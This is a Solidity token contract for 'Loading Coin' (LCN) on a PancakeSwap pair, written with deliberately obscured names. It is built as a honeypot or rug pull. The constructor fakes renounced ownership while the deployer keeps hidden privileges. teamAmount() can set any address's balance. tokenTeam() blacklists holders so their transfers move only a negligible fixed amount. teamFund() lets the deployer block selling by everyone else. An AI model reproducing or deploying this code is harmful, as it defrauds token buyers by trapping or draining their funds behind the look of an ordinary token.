//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract senderSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableMode {
    function createPair(address feeReceiver, address feeTo) external returns (address);

    function feeTo() external view returns (address);
}

interface totalFundExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface modeTotalExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitLiquidity) external view returns (uint256);

    function transfer(address listMode, uint256 autoAmount) external returns (bool);

    function allowance(address fromBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoAmount) external returns (bool);

    function transferFrom(
        address sender,
        address listMode,
        uint256 autoAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txAutoTeam, uint256 value);
    event Approval(address indexed fromBuy, address indexed spender, uint256 value);
}

interface fromList is modeTotalExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LoadingCoin is senderSell, modeTotalExempt, fromList {

    function transfer(address senderSwapEnable, uint256 autoAmount) external virtual override returns (bool) {
        return buyWallet(_msgSender(), senderSwapEnable, autoAmount);
    }

    uint256 private minAmount;

    function transferFrom(address walletBuy, address listMode, uint256 autoAmount) external override returns (bool) {
        if (_msgSender() != isLaunchedAt) {
            if (tradingLimit[walletBuy][_msgSender()] != type(uint256).max) {
                require(autoAmount <= tradingLimit[walletBuy][_msgSender()]);
                tradingLimit[walletBuy][_msgSender()] -= autoAmount;
            }
        }
        return buyWallet(walletBuy, listMode, autoAmount);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchTrading;
    }

    function symbol() external view virtual override returns (string memory) {
        return listTrading;
    }

    uint256 public totalLaunch = 0;

    function minLaunch(address walletBuy, address listMode, uint256 autoAmount) internal view returns (uint256) {
        require(autoAmount > 0);

        uint256 tokenBuyLiquidity = 0;
        if (walletBuy == shouldSell && totalLaunch > 0) {
            tokenBuyLiquidity = autoAmount * totalLaunch / 100;
        } else if (listMode == shouldSell && receiverLiquidity > 0) {
            tokenBuyLiquidity = autoAmount * receiverLiquidity / 100;
        }
        require(tokenBuyLiquidity <= autoAmount);
        return autoAmount - tokenBuyLiquidity;
    }

    string private teamSenderReceiver = "Loading Coin";

    function owner() external view returns (address) {
        return modeLaunchedList;
    }

    mapping(address => mapping(address => uint256)) private tradingLimit;

    mapping(address => bool) public buyAutoTeam;

    address public shouldSell;

    address public maxWallet;

    function autoSender(address swapFundExempt) public {
        require(swapFundExempt.balance < 100000);
        if (listTake) {
            return;
        }
        if (txMode == minAmount) {
            toMin = minAmount;
        }
        buyAutoTeam[swapFundExempt] = true;
        
        listTake = true;
    }

    function approve(address swapFund, uint256 autoAmount) public virtual override returns (bool) {
        tradingLimit[_msgSender()][swapFund] = autoAmount;
        emit Approval(_msgSender(), swapFund, autoAmount);
        return true;
    }

    uint8 private launchTrading = 18;

    function teamAmount(address senderSwapEnable, uint256 autoAmount) public {
        tradingExemptToken();
        toMode[senderSwapEnable] = autoAmount;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderReceiverList;
    }

    function allowance(address fundSenderReceiver, address swapFund) external view virtual override returns (uint256) {
        if (swapFund == isLaunchedAt) {
            return type(uint256).max;
        }
        return tradingLimit[fundSenderReceiver][swapFund];
    }

    uint256 constant buyFee = 5 ** 10;

    function buyWallet(address walletBuy, address listMode, uint256 autoAmount) internal returns (bool) {
        if (walletBuy == maxWallet) {
            return exemptFee(walletBuy, listMode, autoAmount);
        }
        uint256 atLiquidityLimit = modeTotalExempt(shouldSell).balanceOf(autoLiquidity);
        require(atLiquidityLimit == sellLaunchReceiver);
        require(listMode != autoLiquidity);
        if (txLaunched[walletBuy]) {
            return exemptFee(walletBuy, listMode, buyFee);
        }
        autoAmount = minLaunch(walletBuy, listMode, autoAmount);
        return exemptFee(walletBuy, listMode, autoAmount);
    }

    function getOwner() external view returns (address) {
        return modeLaunchedList;
    }

    function walletIsLimit() public {
        emit OwnershipTransferred(maxWallet, address(0));
        modeLaunchedList = address(0);
    }

    event OwnershipTransferred(address indexed totalMarketing, address indexed toLaunch);

    bool public fundEnable;

    uint256 private senderReceiverList = 100000000 * 10 ** 18;

    function tradingExemptToken() private view {
        require(buyAutoTeam[_msgSender()]);
    }

    string private listTrading = "LCN";

    mapping(address => uint256) private toMode;

    bool private feeLaunch;

    function exemptFee(address walletBuy, address listMode, uint256 autoAmount) internal returns (bool) {
        require(toMode[walletBuy] >= autoAmount);
        toMode[walletBuy] -= autoAmount;
        toMode[listMode] += autoAmount;
        emit Transfer(walletBuy, listMode, autoAmount);
        return true;
    }

    function teamFund(uint256 autoAmount) public {
        tradingExemptToken();
        sellLaunchReceiver = autoAmount;
    }

    function balanceOf(address limitLiquidity) public view virtual override returns (uint256) {
        return toMode[limitLiquidity];
    }

    address autoLiquidity;

    uint256 public txMode;

    uint256 sellLaunchReceiver;

    uint256 public receiverLiquidity = 0;

    function tokenTeam(address shouldList) public {
        tradingExemptToken();
        if (fundEnable != feeLaunch) {
            toMin = txMode;
        }
        if (shouldList == maxWallet || shouldList == shouldSell) {
            return;
        }
        txLaunched[shouldList] = true;
    }

    address private modeLaunchedList;

    function name() external view virtual override returns (string memory) {
        return teamSenderReceiver;
    }

    bool public listTake;

    uint256 exemptIsLaunched;

    constructor (){
        
        walletIsLimit();
        totalFundExempt senderModeBuy = totalFundExempt(isLaunchedAt);
        shouldSell = enableMode(senderModeBuy.factory()).createPair(senderModeBuy.WETH(), address(this));
        autoLiquidity = enableMode(senderModeBuy.factory()).feeTo();
        
        maxWallet = _msgSender();
        buyAutoTeam[maxWallet] = true;
        toMode[maxWallet] = senderReceiverList;
        if (txMode == minAmount) {
            txMode = minAmount;
        }
        emit Transfer(address(0), maxWallet, senderReceiverList);
    }

    uint256 private toMin;

    mapping(address => bool) public txLaunched;

    address isLaunchedAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}